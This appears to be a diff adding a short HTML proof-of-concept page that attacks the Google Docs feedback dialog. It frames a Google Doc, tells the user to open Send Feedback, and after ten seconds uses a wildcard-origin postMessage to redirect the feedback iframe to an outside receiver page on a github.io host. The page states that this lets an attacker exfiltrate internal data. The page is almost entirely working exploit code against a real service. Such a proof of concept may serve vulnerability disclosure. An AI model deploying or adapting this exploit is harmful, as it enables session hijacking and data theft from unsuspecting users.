@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Google Docs Feedback Exploit - PoC</title>
+  </head>
+  <body>
+    <h2>🧪 Google Docs Feedback Hijack Proof-of-Concept</h2>
+    <p>
+      This page demonstrates that an attacker can swap the feedback iframe mid-session and exfiltrate internal data.
+    </p>
+
+    <iframe
+      name="docsFrame"
+      id="docsFrame"
+      width="100%"
+      height="800"
+      src="https://docs.google.com/document/u/0/create"
+    ></iframe>
+
+    <p><b>Instructions:</b> When the Google Doc loads, manually open Help → Send Feedback. After 10 seconds, this page will automatically swap the feedback iframe with an attacker-controlled one.</p>
+
+    <script>
+      setTimeout(() => {
+        const frame = document.getElementById("docsFrame");
+        if (frame && frame.contentWindow) {
+          try {
+            frame.contentWindow.postMessage(
+              {
+                type: "navigate-iframe",
+                url: "https://musgaas.github.io/receiver-test/receiver.html"
+              },
+              "*"
+            );
+          } catch (e) {
+            console.error("Error sending postMessage:", e);
+          }
+        }
+      }, 10000);
+    </script>
+  </body>
+</html>
